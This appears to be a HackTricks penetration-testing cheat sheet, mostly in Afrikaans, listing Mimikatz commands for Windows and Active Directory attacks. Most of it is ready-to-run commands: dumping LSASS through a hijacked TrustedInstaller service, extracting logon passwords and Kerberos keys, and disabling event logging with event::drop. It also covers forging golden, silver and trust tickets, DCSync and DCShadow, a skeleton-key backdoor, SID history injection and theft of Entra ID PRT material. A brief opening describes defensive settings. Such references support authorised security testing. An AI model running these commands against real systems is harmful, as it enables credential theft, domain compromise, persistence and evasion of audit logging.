# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Kyk na die oorspronklike vir verdere inligting!

## LM and Clear-Text in memory

Vanaf Windows 8.1 en Windows Server 2012 R2 word beduidende maatreëls geïmplementeer om teen credential theft te beskerm:

- **LM hashes and plain-text passwords** word nie meer in memory gestoor nie om security te verbeter. ’n Spesifieke registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet met ’n DWORD value van `0` gekonfigureer word om Digest Authentication te deaktiveer, wat verseker dat "clear-text" passwords nie in LSASS gestaaf word nie.

- **LSA Protection** word ingestel om die Local Security Authority (LSA) process te beskerm teen ongemagtigde memory reading en code injection. Dit word bereik deur die LSASS as ’n protected process te merk. Aktivering van LSA Protection behels:
1. Wysig die registry by _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
2. Implementeer ’n Group Policy Object (GPO) wat hierdie registry change oor bestuurde devices afdwing.

Ten spyte van hierdie protections, kan tools soos Mimikatz LSA Protection omseil deur spesifieke drivers te gebruik, hoewel sulke actions waarskynlik in event logs aangeteken sal word.

Op moderne workstations maak dit selfs meer saak omdat **Credential Guard by default op baie Windows 11 22H2+ en Windows Server 2025 domain-joined, non-DC systems geaktiveer is**, terwyl **LSASS-as-PPL by default op vars Windows 11 22H2+ installs geaktiveer is**. In die praktyk beteken dit dat `sekurlsa::logonpasswords` dikwels minder materiaal oplewer as wat ouer tradecraft verwag het en operators al hoe meer oorskakel na **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, of **CloudAP/PRT-georiënteerde modules**. Vir die protection-kant, kyk by [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administrators het tipies SeDebugPrivilege, wat hulle in staat stel om programs te debug. Hierdie privilege kan beperk word om ongemagtigde memory dumps te voorkom, ’n algemene technique wat deur attackers gebruik word om credentials uit memory te onttrek. Selfs met hierdie privilege verwyder, kan die TrustedInstaller account egter steeds memory dumps uitvoer deur ’n aangepaste service configuration te gebruik:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dit laat toe om die `lsass.exe`-geheue na ’n lêer te dump, wat dan op ’n ander stelsel geanaliseer kan word om credentials te onttrek:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Event log tampering in Mimikatz behels twee primêre aksies: die skoonmaak van event logs en die patching van die Event service om logging van nuwe events te voorkom. Hieronder is die commands vir die uitvoering van hierdie aksies:

#### Clearing Event Logs

- **Command**: Hierdie aksie is gemik op die uitvee van die event logs, wat dit moeiliker maak om kwaadwillige aktiwiteite op te spoor.
- Mimikatz bied nie ’n direkte command in sy standaard dokumentasie vir die skoonmaak van event logs direk via sy command line nie. Event log manipulation behels egter tipies die gebruik van system tools of scripts buite Mimikatz om spesifieke logs skoon te maak (bv. deur PowerShell of Windows Event Viewer te gebruik).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Hierdie eksperimentele command is ontwerp om die Event Logging Service se gedrag te wysig, en voorkom effektief dat dit nuwe events opteken.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Die `privilege::debug` command verseker dat Mimikatz met die nodige privileges werk om system services te wysig.
- Die `event::drop` command patch dan die Event Logging service.

### Kerberos Ticket Attacks

Gebruik die commands hieronder as vinnige syntax-herinneringe. Die toegewyde bladsye vir [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), en [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) bevat die bygewerkte AES/PAC/opsec nuanses.

### Golden Ticket Creation

A Golden Ticket laat domain-wide access impersonation toe. Sleutel command en parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Die domain name.
- `/sid`: Die domain se Security Identifier (SID).
- `/user`: Die username om te impersonate.
- `/krbtgt`: Die NTLM hash van die domain se KDC service account.
- `/ptt`: Inject die ticket direk in memory.
- `/ticket`: Stoor die ticket vir later gebruik.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets verleen toegang tot spesifieke dienste. Sleutelopdrag en parameters:

- Command: Soortgelyk aan Golden Ticket, maar teiken spesifieke dienste.
- Parameters:
- `/service`: Die diens om te teiken (bv. cifs, http).
- Ander parameters soortgelyk aan Golden Ticket.

Voorbeeld:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets word gebruik vir toegang tot hulpbronne oor domeine heen deur trust-verhoudings te benut. Belangrike opdrag en parameters:

- Command: Soortgelyk aan Golden Ticket maar vir trust-verhoudings.
- Parameters:
- `/target`: Die teikendom se FQDN.
- `/rc4`: Die NTLM-hash vir die trust-rekening.

Voorbeeld:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Addisionele Kerberos-opdragte

- **Listing Tickets**:

- Command: `kerberos::list`
- Lys alle Kerberos-tickets vir die huidige gebruikersessie.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Inspuit Kerberos-tickets vanaf kaslêers.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Laat toe om 'n Kerberos-ticket in 'n ander sessie te gebruik.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Maak alle Kerberos-tickets uit die sessie skoon.
- Nuttig voordat jy ticket manipulation-opdragte gebruik om konflik te vermy.

### Over-Pass-the-Hash / Pass-the-Key

As `RC4` gedeaktiveer is of onbetroubaar is, kan Mimikatz **AES128/AES256 Kerberos keys** in die huidige logon session patch in plaas van net 'n NT hash gebruik. Dit is gewoonlik 'n beter pasmaat vir moderne domains as om `sekurlsa::pth` as net NTLM-only te behandel.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` hergebruik die huidige proses in plaas daarvan om ’n nuwe konsole te spawn, wat handig is wanneer jy onmiddellik dinge soos `lsadump::dcsync` in dieselfde konteks wil run.

### Active Directory Tampering

- **DCShadow**: Maak tydelik ’n machine as ’n DC optree vir AD object manipulation. Sien [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Mimic ’n DC om password data aan te vra. Sien [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Extract credentials from LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Impersonate ’n DC using a computer account's password data.

- _Geen spesifieke command vir NetSync in die oorspronklike konteks verskaf nie._

- **LSADUMP::SAM**: Access local SAM database.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Decrypt secrets gestoor in die registry.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Stel ’n nuwe NTLM hash vir ’n user.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Retrieve trust authentication information.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Op **Entra ID** of **hybrid-joined** hosts kan `sekurlsa::cloudap` cached **Primary Refresh Token (PRT)** materiaal uit LSASS expose. As die geassosieerde Proof-of-Possession key software-protected is, kan `dpapi::cloudapkd` die clear/derived key materiaal aflei wat nodig is vir opvolgende **Pass-the-PRT** workflows.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Dit word baie moeiliker wanneer die sleutel TPM-backed is, maar dit is die moeite werd om op hybrid endpoints te kyk omdat die gekaste CloudAP-data moontlik interessanter kan wees as klassieke `wdigest`-uitvoer. Vir die cloud-side abuse-ketting, sien [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Inject a backdoor in LSASS op ’n DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Verkry backup-regte.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Verkry debug-privileges.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Wys credentials vir aangemelde users.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extraheer Kerberos-tickets uit memory.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Verander SID en SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Geen spesifieke command vir modify in die oorspronklike konteks nie._

- **TOKEN::Elevate**: Improviseer tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Laat multiple RDP-sessies toe.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lys TS/RDP-sessies.
- _Geen spesifieke command verskaf vir TS::Sessions in die oorspronklike konteks nie._

### Vault

- Extraheer passwords uit Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
